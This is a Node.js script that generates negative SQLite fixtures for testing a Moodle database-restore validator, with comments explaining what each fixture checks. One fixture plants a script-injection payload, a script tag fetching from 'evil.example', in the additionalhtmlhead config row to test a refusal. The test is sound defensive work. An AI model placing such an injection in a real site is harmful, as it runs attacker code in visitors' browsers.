// Build the small SQLite databases the restore-database checks are tested
// against, so they are reproducible rather than mystery binaries in git.
//
// Run: node scripts/make-db-fixtures.mjs
//
// WHY THESE ARE SMALL AND THE POSITIVE ONE IS NOT. The real published snapshot
// (7,958,528 bytes, in test/fixtures/net/) is the positive fixture, because a
// synthesised "good" database proves only that we can read a file we wrote —
// it shares every assumption with the reader. These are NEGATIVES: each one is
// a state the real snapshot cannot show us, and each exists to make a specific
// refusal fail if it stops working.
//
// They carry only the columns the reader touches. A full Moodle schema is 489
// tables; reproducing it would be a second, worse copy of the thing upstream
// already publishes.

import { DatabaseSync } from "node:sqlite";
import { mkdirSync, rmSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const OUT = join(dirname(fileURLToPath(import.meta.url)), "..", "test", "fixtures", "db");

/** The shape a real snapshot has, reduced to what the reader reads. */
function base(db, { config = {}, users = ["admin", "guest"], courses = [["1", "site"]], seq = null } = {}) {
  db.exec(`CREATE TABLE mdl_config (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT)`);
  db.exec(`CREATE TABLE mdl_user (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, deleted INTEGER DEFAULT 0)`);
  db.exec(`CREATE TABLE mdl_course (id INTEGER PRIMARY KEY AUTOINCREMENT, shortname TEXT)`);
  db.exec(`CREATE TABLE mdl_files (id INTEGER PRIMARY KEY AUTOINCREMENT, contenthash TEXT)`);
  const defaults = {
    siteidentifier: "fixtureidentifier0000000000000000localhost",
    version: "2025041408.03",
    release: "5.0.8+ (Build: 20260630)",
    branch: "500",
    siteadmins: "2",
    additionalhtmlhead: "",
  };
  const ins = db.prepare("INSERT INTO mdl_config (name, value) VALUES (?, ?)");
  for (const [k, v] of Object.entries({ ...defaults, ...config })) {
    if (v === null) continue; // null means "this row is absent"
    ins.run(k, v);
  }
  const iu = db.prepare("INSERT INTO mdl_user (id, username) VALUES (?, ?)");
  users.forEach((u, i) => iu.run(i + 1, u));
  const ic = db.prepare("INSERT INTO mdl_course (id, shortname) VALUES (?, ?)");
  for (const [id, shortname] of courses) ic.run(Number(id), shortname);
  if (seq !== null) {
    // AUTOINCREMENT keeps its own counter, and Moodle's course table uses it —
    // so the next id is seq+1, NOT max(id)+1. A snapshot that deleted courses
    // hands out a high id while looking empty, and no fixture built by simple
    // inserts can show that. This is the only way to produce it.
    db.exec(`UPDATE sqlite_sequence SET seq = ${Number(seq)} WHERE name = 'mdl_course'`);
  }
}

const FIXTURES = {
  // Quinn demonstrated this one: with no identity row the builder records "",
  // and `"" === ""` then passes against ANY database. The refusal must fire
  // before the comparison is ever reached.
  "no-siteidentifier.sq3": (db) => base(db, { config: { siteidentifier: null } }),
  // Too short to be a real Moodle identity — the same hole one step along.
  "short-siteidentifier.sq3": (db) => base(db, { config: { siteidentifier: "abc" } }),
  // Cass booted script execution on the playground's origin from a row like
  // this. NOTE the real snapshot carries this row EMPTY, so the refusal keys on
  // a non-empty VALUE — keyed on presence it would reject the published file.
  "html-injection.sq3": (db) =>
    base(db, { config: { additionalhtmlhead: "<script>fetch('//evil.example')</script>" } }),
  // A course whose shortname collides with the preview's own. createCourse
  // would abort the boot on shortnametaken, five steps in.
  "review-course.sq3": (db) =>
    base(db, { courses: [["1", "site"], ["2", "REVIEW"]] }),
  // A user whose name collides with an account the preview creates.
  "student1-user.sq3": (db) => base(db, { users: ["admin", "guest", "student1"] }),
  // The admin renamed. `login` does MUST_EXIST on the username, so this kills
  // the boot with nothing naming the cause.
  "renamed-admin.sq3": (db) => base(db, { users: ["siteadmin", "guest"] }),
  // The sequence disagrees with the data: one course, but the next id is 41.
  "high-sequence.sq3": (db) => base(db, { seq: 40 }),
  // A Moodle from a different version. The restore disables
  // moodle_needs_upgrading() permanently, so nothing downstream would notice.
  "old-version.sq3": (db) =>
    base(db, { config: { version: "2023100900.00", release: "4.3.9+ (Build: 20250101)", branch: "403" } }),
};

rmSync(OUT, { recursive: true, force: true });
mkdirSync(OUT, { recursive: true });
for (const [name, build] of Object.entries(FIXTURES)) {
  const path = join(OUT, name);
  const db = new DatabaseSync(path);
  build(db);
  db.close();
  console.log(`built ${name}`);
}
console.log(`\n${Object.keys(FIXTURES).length} negative fixtures in ${OUT}`);
